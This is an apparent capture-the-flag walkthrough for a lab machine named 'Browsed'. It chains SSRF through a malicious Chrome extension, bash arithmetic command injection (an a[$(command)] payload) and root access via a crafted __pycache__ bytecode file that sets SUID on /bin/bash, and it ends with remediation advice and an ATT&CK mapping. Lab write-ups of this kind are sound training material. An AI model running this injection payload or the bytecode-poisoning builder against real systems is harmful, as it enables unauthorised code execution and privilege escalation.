# Browsed — Walkthrough

> Note: all flags, private keys, attacker addresses and other sensitive data are
> redacted (`[REDACTED]`, `<ATTACKER_IP>`, `<TARGET_IP>`, `<LPORT>`).

## Overview

| Item | Value |
|------|-------|
| Machine | Browsed |
| OS | Ubuntu Linux |
| Initial access | Chrome extension upload into a headless Chrome (SSRF to internal services) |
| User | command injection in an internal Flask application |
| Root | Python bytecode cache poisoning (`__pycache__`) via a sudo script |

---

## 1. Enumeration

### 1.1 Port scan

```
nmap -sC -sV -p- <TARGET_IP>
```

Open ports:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) |

The site title on port 80 is "Browsed". Small attack surface, so the focus is the web app.

### 1.2 Web application

The port 80 application accepts a **Chrome extension zip** and loads it into a
**headless Chrome** on the server, returning a verbose debug log of that process.

---

## 2. Initial access — SSRF via the extension

### 2.1 Test extension

A minimal Manifest V3 extension with a content script that logs to the console
confirmed that our code runs inside the headless Chrome on the server.

`manifest.json`:
```json
{
  "manifest_version": 3,
  "name": "Test Log",
  "version": "1.0",
  "content_scripts": [
    { "matches": ["<all_urls>"], "js": ["content.js"] }
  ]
}
```

`content.js`:
```js
console.log("loaded on:", window.location.href);
```

### 2.2 Discovering internal services

The debug log showed that the headless Chrome runs with home `/var/www` (the web
user) and visits internal resources that are not reachable externally:

- `http://browsedinternals.htb/` — internal vhost
- `http://localhost/`

The resources served from `browsedinternals.htb` (`theme-gitea-auto.css`,
`index.js`, ...) identify **Gitea 1.24.5**.

### 2.3 Reaching the internal Gitea

Adding the vhost to `/etc/hosts` (same IP, vhost on port 80) makes Gitea reachable
directly as well:

```
<TARGET_IP> browsedinternals.htb
```

Under `/explore/repos` there is a public repository `larry/MarkdownPreview`, cloned
without authentication:

```
git clone http://browsedinternals.htb/larry/MarkdownPreview.git
```

---

## 3. RCE as larry — command injection

The repository holds the source of an internal Flask application (`app.py`) that
runs on `127.0.0.1:5000` as the user **larry**.

Vulnerable route:

```python
@app.route('/routines/<rid>')
def routines(rid):
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

`routines.sh`:

```bash
if [[ "$1" -eq 0 ]]; then
...
```

The `-eq` operator inside `[[ ]]` makes bash evaluate the operand as an
**arithmetic expression**, and arithmetic evaluation performs `$(...)` command
substitution. A payload of the form `a[$(command)]` therefore executes `command`
as larry.

Since `localhost:5000` is only reachable from the server, the request is sent
through the same extension (a background service worker with `host_permissions`
for `localhost:5000`), giving an SSRF into the internal application and, through
it, remote code execution.

Sending a request to `http://localhost:5000/routines/<url-encoded payload>` yields
code execution as larry and then an interactive shell.

### 3.1 Access persistence

An SSH private key (`[REDACTED]`) was found in `/home/larry/.ssh/`, enabling stable
SSH access as larry and retrieval of the user flag (`[REDACTED]`).

---

## 4. Privilege escalation — root

### 4.1 Sudo right

```
sudo -l
```

```
User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

### 4.2 Vulnerability: __pycache__ poisoning

- `extension_tool.py` runs as root and, at the top of the file, does
  `from extension_utils import validate_manifest, clean_temp_files`.
- `/opt/extensiontool/__pycache__` has permissions `drwxrwxrwx` (777) — writable by larry.
- On import, Python uses `__pycache__/extension_utils.cpython-312.pyc` if the `mtime`
  and size of the source `.py` stored in the `.pyc` header match the actual file.

### 4.3 Exploitation

Craft a poisoned `.pyc` whose bytecode is arbitrary but whose header carries the
`mtime` and size matching the original `extension_utils.py`. Builder (run on the
target with Python 3.12 so the magic number is correct):

```python
import importlib.util, marshal, struct, os

module_src = '''
import os
os.system("chmod +s /bin/bash")

def validate_manifest(path):
    return {}

def clean_temp_files(x):
    pass
'''

src = "/opt/extensiontool/extension_utils.py"
out = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

code = compile(module_src, src, "exec")
st = os.stat(src)
with open(out, "wb") as f:
    f.write(importlib.util.MAGIC_NUMBER)
    f.write(struct.pack("<I", 0))
    f.write(struct.pack("<I", int(st.st_mtime)))
    f.write(struct.pack("<I", st.st_size & 0xFFFFFFFF))
    f.write(marshal.dumps(code))
```

Trigger:

```
python3 payload.py
sudo /opt/extensiontool/extension_tool.py --ext Fontify
```

Importing the module executes `chmod +s /bin/bash` as root. Then:

```
bash -p
# euid=root
```

The root flag (`[REDACTED]`) is readable in `/root/`.

> Note: `from ... import ...` first executes all module code, and only then binds
> the names. The payload therefore runs even when an `ImportError` is reported
> afterwards — that error is cosmetic.

---

## 5. Remediation recommendations

| # | Issue | Fix |
|---|-------|-----|
| 1 | Headless Chrome loads arbitrary user extensions and reaches internal services | Run the browser in an isolated sandbox with no internal-network access; block `localhost`/internal vhosts from that context; strip the verbose debug log from the user-facing response |
| 2 | Internal source code publicly exposed on Gitea | Make repos private; remove unauthenticated access; rotate any credentials/keys that may have leaked |
| 3 | SSH private key on disk readable by a compromised service | Do not store private keys readable by service accounts; rotate the key |
| 4 | Command injection in `routines.sh` (`[[ "$1" -eq 0 ]]`) | Validate that the input is an integer before comparison (e.g. regex `^[0-9]+$`); use `case`/numeric checks instead of `-eq` on unsanitized input |
| 5 | Flask app reachable locally but with no auth on a dangerous route | Remove/protect `/routines`; apply least privilege |
| 6 | `sudo NOPASSWD` on a Python script | Restrict sudo; do not run user-modifiable code as root |
| 7 | `__pycache__` with 777 permissions | Set restrictive permissions (root-only); consider `PYTHONDONTWRITEBYTECODE=1`; keep code and cache outside paths writable by unprivileged users |
| 8 | SUID on `/bin/bash` (exploitation artifact) | Remove the SUID bit: `chmod u-s,g-s /bin/bash`; verify system integrity |

---

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Reconnaissance | Active Scanning | T1595 |
| Reconnaissance | Gather Victim Host Information | T1592 |
| Initial Access | Exploit Public-Facing Application (SSRF abuse) | T1190 |
| Discovery | Network Service Discovery | T1046 |
| Collection | Data from Information Repositories (Gitea) | T1213 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Execution | Exploitation for Client Execution | T1203 |
| Credential Access | Unsecured Credentials: Private Keys | T1552.004 |
| Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Privilege Escalation | Hijack Execution Flow (bytecode cache poisoning) | T1574 |
| Privilege Escalation | Setuid and Setgid | T1548.001 |
